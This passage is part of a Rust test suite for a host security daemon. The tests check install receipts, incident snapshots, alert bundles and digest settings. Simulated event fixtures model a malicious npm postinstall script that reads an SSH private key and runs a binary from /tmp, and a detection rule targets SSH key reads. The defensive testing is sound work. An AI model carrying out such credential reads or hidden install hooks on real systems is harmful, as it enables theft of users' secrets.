        let (d, _) = dev_daemon(dir.path());
        let s = d.status();
        for k in ["installed_at", "baseline", "proposals", "demoted_rules"] {
            assert!(s.get(k).is_some(), "status missing {}", k);
        }
        let b = &s["baseline"];
        for k in ["learning", "learning_ends", "proposals", "learned", "demoted"] {
            assert!(b.get(k).is_some(), "status.baseline missing {}", k);
        }
        assert!(b["learning"].as_bool().unwrap(), "a fresh install is learning");
        assert!(b["demoted"].is_array());
        assert!(s["proposals"].is_array());
        assert!(s["demoted_rules"].is_array());
        assert!(s["installed_at"].as_str().unwrap().ends_with('Z'));
    }

    #[test]
    fn installed_at_is_read_back_out_of_state_json() {
        let dir = tempfile::tempdir().unwrap();
        let (d, cfg) = dev_daemon(dir.path());
        d.write_state();
        let stamped = d.baseline.state.installed_at;
        // A wiped baseline.json must not restart the window.
        std::fs::remove_file(cfg.paths.state_dir.join("baseline.json")).ok();
        let d2 = {
            let mut c = cfg.clone();
            c.baseline.learning_days = 7;
            Daemon::new(c, &dir.path().join("moat.toml")).unwrap()
        };
        assert_eq!(d2.baseline.state.installed_at, stamped);
    }

    // ------------------------------------------ receipts, incidents, digest

    /// LEARNING §3: one install, one receipt, written when the **root** exits.
    #[test]
    fn a_package_install_writes_exactly_one_receipt_when_its_root_exits() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let t0 = util::rfc3339_of(util::unix_secs());

        // npm -> sh -> node(postinstall), plus a nested npm frame that must not
        // produce a second receipt, and a binary out of /tmp.
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-npm","pid":41201,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/npm","arguments":"install","start_time":"{}"}}}}}}"#,
            t0
        ));
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-npm2","pid":41210,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/npm","arguments":"run build","start_time":"{}","parent_exec_id":"r-npm"}}}}}}"#,
            t0
        ));
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-node","pid":41233,"uid":1000,"cwd":"/home/dan/proj","binary":"/usr/bin/node","arguments":"/home/dan/proj/node_modules/evil/setup.mjs","start_time":"{}","parent_exec_id":"r-npm2"}}}}}}"#,
            t0
        ));
        d.handle_line(&format!(
            r#"{{"process_exec":{{"process":{{"exec_id":"r-tmp","pid":41240,"uid":1000,"cwd":"/home/dan/proj","binary":"/tmp/.x9k","arguments":"","start_time":"{}","parent_exec_id":"r-node"}}}}}}"#,
            t0
        ));
        // A credential read inside the install, and a persistence write.
        d.handle_line(r#"{"process_kprobe":{"process":{"exec_id":"r-node","pid":41233,"uid":1000,"binary":"/usr/bin/node","cwd":"/home/dan/proj","parent_exec_id":"r-npm2"},"function_name":"security_file_permission","policy_name":"moat-cred-ssh-private-key-read","args":[{"file_arg":{"path":"/home/dan/.ssh/id_rsa"}},{"int_arg":4}]},"time":"2026-09-03T16:21:07.000Z"}"#);

        assert_eq!(d.store.receipts().len(), 0, "nothing until the root exits");
        // The nested npm exiting is not the end of the install.
        d.handle_line(r#"{"process_exit":{"process":{"exec_id":"r-npm2","pid":41210,"binary":"/usr/bin/npm"},"status":0}}"#);
        assert_eq!(d.store.receipts().len(), 0, "only the outermost root closes it");

        d.handle_line(r#"{"process_exit":{"process":{"exec_id":"r-npm","pid":41201,"binary":"/usr/bin/npm","arguments":"install"},"status":0}}"#);
        let rs = d.store.receipts();
        assert_eq!(rs.len(), 1, "one install, one receipt");
        let r = &rs[0];
        assert_eq!(r.root_exe, "/usr/bin/npm");
        assert_eq!(r.root_args, "install");
        assert_eq!(r.cwd, "/home/dan/proj");
        assert_eq!(r.exit, 0);
        assert_eq!(r.postinstall_scripts, vec!["evil"], "the node_modules package");
        assert_eq!(r.credential_reads, vec!["/home/dan/.ssh/id_rsa"]);
        assert_eq!(r.execs_from_tmp, 1);
        assert!(!r.id.is_empty());
        // A receipt is not an alert: it never reaches the badge.
        assert!(!d.store.load().iter().any(|a| a.rule.contains("receipt")));
        assert_eq!(d.receipt_list(10).len(), 1);
    }

    /// LEARNING §4: a high alert is snapshotted, a low one is not, and the
    /// snapshot reaches the record as an update line.
    #[test]
    fn a_high_alert_gets_an_incident_snapshot_and_a_low_one_does_not() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);

        let alerts = d.store.load();
        let base = d.incidents_dir();
        for a in &alerts {
            let want = crate::alert::severity_rank(&a.severity) >= 2 && !a.is_suppressed();
            assert_eq!(
                a.incident.is_some(),
                want,
                "{} ({}) incident: {:?}",
                a.rule,
                a.severity,
                a.incident
            );
            if let Some(inc) = &a.incident {
                assert_eq!(inc.dir, base.join(&a.id).display().to_string());
                assert!(base.join(&a.id).join("process.json").exists());
                assert!(base.join(&a.id).join("tree.txt").exists());
                assert!(base.join(&a.id).join("net.txt").exists());
                assert!(base.join(&a.id).join("meta.json").exists());
                assert!(inc.files.iter().any(|f| f.name == "process.json"));
                for f in &inc.files {
                    assert_eq!(f.sha256.len(), 64, "{} has no hash", f.name);
                }
                // tree.txt is the daemon's own view of the chain.
                let tree = std::fs::read_to_string(base.join(&a.id).join("tree.txt")).unwrap();
                assert!(tree.contains(&a.process.exe), "{}", tree);
            }
        }
        assert!(d.incidents_captured > 0);
        assert_eq!(
            crate::incident::count(&base) as u64,
            d.incidents_captured,
            "one directory per capture"
        );
        assert_eq!(d.status()["incidents"], d.incidents_captured);
    }

    /// The threshold is a config key, and `never` is a real off switch.
    #[test]
    fn the_snapshot_threshold_is_configurable() {
        for (min, want) in [("critical", true), ("never", false)] {
            let dir = tempfile::tempdir().unwrap();
            let (mut d, _) = dev_daemon(dir.path());
            d.cfg.incidents.snapshot_min_severity = min.into();
            replay(&mut d);
            let any = d.store.load().iter().any(|a| a.incident.is_some());
            assert_eq!(any, want, "min = {}", min);
            if min == "critical" {
                for a in d.store.load() {
                    if a.incident.is_some() {
                        assert_eq!(a.severity, "critical");
                    }
                }
            }
        }
    }

    /// LEARNING §2: the bundle, and the fact that the daemon writes it and
    /// nothing else.
    #[test]
    fn the_bundle_is_written_next_to_the_snapshot_and_fences_process_strings() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        replay(&mut d);
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-cred-ssh-private-key-read")
            .unwrap();

        let path = d.write_bundle(&a.id).unwrap();
        assert_eq!(path, d.incidents_dir().join(&a.id).join("bundle.md"));
        let md = std::fs::read_to_string(&path).unwrap();
        assert!(md.contains(&format!("# Moat alert {}", a.id)));
        assert!(md.contains("```DATA"));
        assert!(md.contains("/home/dan/.ssh/id_ed25519"), "the alerted file is in the bundle");
        assert!(md.contains("## Incident snapshot"), "the snapshot is linked");
        assert!(md.contains("process.json"));
        // The ancestry gets args and cwd back from the live table.
        assert!(md.contains("args: /usr/lib/node_modules/npm/bin/npm-cli.js install") || md.contains("args: install"), "{}", md);
        // A second call is idempotent, and an unknown id is a clear error.
        assert_eq!(d.write_bundle(&a.id).unwrap(), path);
        assert!(d.write_bundle("01NOPE").unwrap_err().contains("no alert"));
    }

    /// LEARNING §5: the daemon computes the digest; it never sends it.
    #[test]
    fn the_digest_counts_the_week_and_persists_its_switch() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        replay(&mut d);

        let now = util::unix_secs();
        let g = d.digest(now);
        assert!(g.enabled, "on by default");
        assert!(g.due > now);
        let high = d
            .store
            .load()
            .iter()
            .filter(|a| !a.is_suppressed() && a.severity_rank() >= 2)
            .count() as u64;
        assert_eq!(g.summary.incidents, high);
        assert_eq!(g.summary.installs, d.store.receipts().len() as u64);
        assert!(g.summary.text().starts_with("moat: "));
        assert_eq!(d.status()["digest"], true);

        // The off switch lives in state.json, so it survives a restart.
        d.set_digest(false);
        assert_eq!(d.status()["digest"], false);
        assert_eq!(d.status()["digest_enabled"], false);
        let d2 = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert!(!d2.digest_enabled, "state.json remembers the switch");

        // And a delivery is recorded so a catch-up run does not send twice.
        d.digest_sent(now);
        assert_eq!(d.digest(now).last_sent, now);
        let d3 = Daemon::new(cfg, &dir.path().join("moat.toml")).unwrap();
        assert_eq!(d3.digest_last_sent, now);
    }

    #[test]
    fn access_words() {
        assert_eq!(access_word(Some(4)).unwrap(), "read");
        assert_eq!(access_word(Some(2)).unwrap(), "write");
        assert_eq!(access_word(Some(6)).unwrap(), "read+write");
        assert_eq!(access_word(Some(0)).unwrap(), "mask 0");
        assert!(access_word(None).is_none());
    }
}
